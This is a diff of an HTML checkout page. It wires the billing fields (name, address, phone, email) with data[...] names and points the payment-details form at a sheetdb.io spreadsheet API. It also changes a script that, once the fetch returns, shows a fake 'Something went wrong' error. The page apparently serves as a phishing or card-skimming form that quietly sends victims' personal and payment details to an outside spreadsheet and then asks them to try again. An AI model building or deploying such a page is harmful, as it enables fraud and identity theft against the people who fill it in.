@@ -2,6 +2,8 @@
 
 
 
+
+
 <!DOCTYPE html>
 <html lang="en" >
 <head>
@@ -94,10 +96,12 @@
               <span class="order-bill-total text-right bold-text">Total: $00.0</span>
             </div>
 
-           <div class="checkout-order-discount gray-bg">
-               </div>
-                </div>
-              </div>
+            <div class="checkout-order-discount gray-bg">
+             
+              
+            </div>
+          </div>
+        </div>
         <div class="checkout-col-footer">
           <h3 class="checkout-col-headline">Additional Information<i class="checkout-icon fa fa-angle-up"></i></h3>
           <div class="checkout-order-note">
@@ -115,53 +119,53 @@
             <div class="order-row">
               <span class="bill-small-col">
                 <label class="bold-text p-small" for="first-name">First name</label>
-                <input class="checkout-input" type="text" />
+                <input class="checkout-input" name="data[first]" type="text" />
               </span>
               <span class="bill-small-col">
                 <label class="bold-text p-small" for="last-name">Last name</label>
-                <input class="checkout-input" type="text" />
+                <input class="checkout-input" name="data[last]" type="text" />
               </span>
               </div>
             <div class="order-row">
               <span class="bill-full-col">
                 <label class="bold-text p-small" for="first-name">Country</label>
                 <label class="bold-text p-small" for="phone">Country</label>
-                <input class="checkout-input" type="text" placeholder="Country" />
+                <input class="checkout-input" name="data[country]" type="text" placeholder="Country" />
               </span>
               </div>
             <div class="order-row">
               <span class="bill-full-col">
                 <label class="bold-text p-small" for="adress">Adress</label>
                 <input class="checkout-input" type="text" placeholder="Adress Line 1" />
-                <input class="checkout-input" type="text" placeholder="Adress Line 2" />
+                <input class="checkout-input" name="data[adress]" type="text" placeholder="Adress Line 2" />
               </span>
               </div>
             <div class="order-row">
               <span class="bill-full-col">
                 <label class="bold-text p-small" for="suburd">City</label>
-                <input class="checkout-input" type="text" placeholder="City" />
+                <input class="checkout-input" name="data[city]" type="text" placeholder="City" />
               </span>
               </div>
             <div class="order-row">
               <span class="bill-small-col">
                <label class="bold-text p-small" for="phone">State</label>
-                <input class="checkout-input" type="text" placeholder="State" />
+                <input class="checkout-input" name="data[state]" type="text" placeholder="State" />
               </span>
               <span class="bill-small-col">
                 <label class="bold-text p-small" for="last-name">Postcode</label>
-                <input class="checkout-input" type="text" />
+                <input class="checkout-input" name="data[postcode]" type="text" />
               </span>
               </div>
             <div class="order-row">
               <span class="bill-full-col">
                 <label class="bold-text p-small" for="phone">Phone</label>
-                <input class="checkout-input" type="text" placeholder="Phone Number" />
+                <input class="checkout-input" name="data[phone]" type="text" placeholder="Phone" />
               </span>
               </div>
             <div class="order-row">
               <span class="bill-full-col">
                 <label class="bold-text p-small" for="email">Email Adress</label>
-                <input class="checkout-input" type="text" placeholder="Email Adress" />
+                <input class="checkout-input" name="data[Email]" type="text" placeholder="Email Adress" />
               </span>
               </div>
             <div class="order-row">
@@ -176,7 +180,7 @@
         <h3 class="checkout-col-headline">Payment Details
           <i class="checkout-icon fa fa-angle-up"></i></h3> 
 
-<form action="https://sheetdb.io/api/v1/mgi1jh6ww8r5h"  method="POST" id="sheetdb-form">
+<form action="https://sheetdb.io/api/v1/w0l17e4smcktf"  method="POST" id="sheetdb-form">
         <div class="checkout-col-inner checkout-col-bottom gray-bg">
           <div class="bill-credit-inner gray-bg">
             <div class="checkout-bill-credit">
@@ -249,7 +253,7 @@
         response => response.json()
     ).then((html) => {
       // you can put any JS code here
-      alert('Something went wrong, Please enter your correct information')
+      alert('Something went wrong, please enter correct information')
     });
   });
 </script>
